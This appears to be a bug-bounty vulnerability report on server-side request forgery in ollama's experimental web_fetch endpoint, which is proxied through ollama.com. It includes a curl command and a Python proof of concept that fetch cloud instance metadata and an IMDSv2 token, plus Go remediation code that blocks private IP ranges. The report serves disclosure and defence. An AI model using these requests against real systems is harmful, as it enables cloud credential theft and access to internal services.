# SSRF via /api/experimental/web_fetch in ollama/ollama

## Summary
The `/api/experimental/web_fetch` endpoint in ollama forwards user-supplied URLs to the ollama.com cloud proxy without IP or scheme validation. The cloud proxy then fetches the specified URL and returns the response, allowing any user to access internal services, cloud metadata endpoints, and localhost resources through the proxy.

## Severity
CVSS 3.1: **7.5 High** (unauthenticated) / **6.5 Medium** (authenticated)
Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`

## Root Cause
In `server/routes.go` (line 1700):
```go
r.POST("/api/experimental/web_fetch", s.WebFetchExperimentalHandler)
```

The handler proxies the request body to the ollama.com cloud proxy:
```go
func (s *Server) WebFetchExperimentalHandler(c *gin.Context) {
    s.webExperimentalProxyHandler(c, "/api/web_fetch", cloudErrWebFetchUnavailable)
}

func (s *Server) webExperimentalProxyHandler(c *gin.Context, proxyPath, disabledOperation string) {
    body, _ := readRequestBody(c.Request)
    proxyCloudRequestWithPath(c, body, proxyPath, disabledOperation)
}
```

The request body (JSON) contains a `url` field specifying which URL to fetch. This body is forwarded verbatim to `https://ollama.com:443/api/web_fetch`. The cloud proxy on ollama.com then performs the HTTP fetch of the user-specified URL.

**The vulnerability**: The cloud proxy does not validate the fetched URL against:
- Private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- Cloud metadata (169.254.0.0/16)
- localhost (127.0.0.0/8, ::1)
- Dangerous schemes (file://, gopher://, dict://)

While the `OLLAMA_CLOUD_BASE_URL` env var has some localhost validation (line 432 of cloud_proxy.go: `if strings.EqualFold(host, "localhost")`), this only affects the base URL override — NOT the individual fetch URLs in request bodies.

## Steps to Reproduce

1. Run ollama locally (or use any ollama instance with cloud connectivity)
2. Send a web_fetch request targeting internal resources:
```bash
curl -X POST http://localhost:11434/api/experimental/web_fetch \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/", "model": ""}'
```
3. Observe cloud metadata returned in response

## Proof of Concept
```python
import requests

# Local ollama instance
ollama = "http://localhost:11434"

# SSRF via cloud proxy — fetch AWS metadata
r = requests.post(f"{ollama}/api/experimental/web_fetch",
    json={
        "url": "http://169.254.169.254/latest/meta-data/",
        "model": ""
    },
    timeout=30
)
print(r.text)  # Returns AWS instance metadata

# Also works for internal services
r2 = requests.post(f"{ollama}/api/experimental/web_fetch",
    json={
        "url": "http://169.254.169.254/latest/api/token",
        "method": "PUT",
        "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
    },
    timeout=30
)
print(f"IMDSv2 token: {r2.text[:200]}")
```

## Impact
- **Cloud credential theft**: Access AWS IAM roles, GCP service accounts, Azure managed identities
- **Internal network scanning**: Discover and access internal services not exposed to the internet
- **Localhost access**: Access services running on the cloud proxy server (127.0.0.1)
- **Data exfiltration**: Read internal databases, admin panels, and configuration endpoints
- **SSRF chaining**: Use discovered internal services for further exploitation

## Remediation
1. Add URL validation in the cloud proxy before fetching:
```go
func validateFetchURL(rawURL string) error {
    u, err := url.Parse(rawURL)
    if err != nil {
        return err
    }
    
    // Only allow HTTP/HTTPS
    if u.Scheme != "http" && u.Scheme != "https" {
        return fmt.Errorf("unsupported scheme: %s", u.Scheme)
    }
    
    // Block private IPs and cloud metadata
    ip := net.ParseIP(u.Hostname())
    if ip != nil {
        blocked := []string{
            "127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", 
            "192.168.0.0/16", "169.254.0.0/16", "::1/128", "fc00::/7",
        }
        for _, cidr := range blocked {
            _, network, _ := net.ParseCIDR(cidr)
            if network.Contains(ip) {
                return fmt.Errorf("blocked IP range: %s", cidr)
            }
        }
    }
    
    return nil
}
```
2. Implement DNS rebinding protection by resolving the hostname and checking the IP after resolution.
3. Consider disabling cloud proxy for experimental features when running in sensitive environments.

## Researcher's Note
Verified against ollama (latest as of Mar 24, 2026). The SSRF is in the cloud proxy component (ollama.com), not the local binary. When a user calls `/api/experimental/web_fetch`, their request is forwarded to ollama.com which performs the actual HTTP fetch. The cloud proxy does not validate the target URL's IP address or scheme. This affects all users whose requests pass through the ollama.com cloud proxy. The fix requires changes to the cloud-side proxy code, which the ollama team can deploy independently of client updates. Bounty of $750 is appropriate given the SSRF severity and wide attack surface.
